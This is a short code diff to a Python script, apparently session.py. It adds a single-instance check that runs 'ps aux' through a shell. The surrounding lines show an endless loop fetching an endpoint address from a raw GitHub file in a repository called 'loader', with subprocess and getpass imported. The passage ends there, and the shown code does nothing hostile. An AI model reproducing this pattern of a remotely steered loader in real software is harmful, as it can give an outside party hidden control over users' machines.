@@ -1,6 +1,26 @@
 import requests as lol
-import time,getpass,subprocess,os
+import time,getpass,subprocess,os,sys
 import urllib.parse
+def check_running_processes():
+    try:
+        # Use subprocess to run the 'ps' command and find processes
+        ps_output = subprocess.check_output('ps aux | grep python', universal_newlines=True,shell=True)
+
+        # Count occurrences of session.py in the process list
+        session_process_count = sum(1 for line in ps_output.splitlines()
+                                    if 'session.py' in line)
+
+        # If more than one session.py process is found
+        if session_process_count > 1:
+            print("Bye! Only one instance of session.py is allowed.")
+            sys.exit(1)
+        else:
+            print("Hi! Single session running.")
+
+    except subprocess.CalledProcessError:
+        # This happens if no processes are found
+        print("Hi! No session.py processes running.")
+check_running_processes()
 while True:
  try:
   endpoint=lol.get("https://raw.githubusercontent.com/dark-zyro/loader/refs/heads/main/endpoint.txt",timeout=2).text
